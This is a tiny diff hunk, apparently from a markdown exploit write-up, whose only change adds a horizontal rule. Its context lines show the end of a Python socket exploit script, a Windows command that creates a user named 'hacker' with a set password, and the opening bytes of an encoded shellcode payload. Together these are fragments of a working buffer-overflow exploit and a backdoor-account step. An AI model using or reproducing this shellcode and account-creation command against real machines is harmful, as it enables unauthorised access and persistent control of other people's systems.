@@ -32,6 +32,8 @@ response = s.recv(1024)
 s.close()
 ```
 
+- - - - 
+
 > net user hacker C0mpL3xP@ss /add
 ```
 "\xda\xda\xbf\xe3\x98\x7d\xcb\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
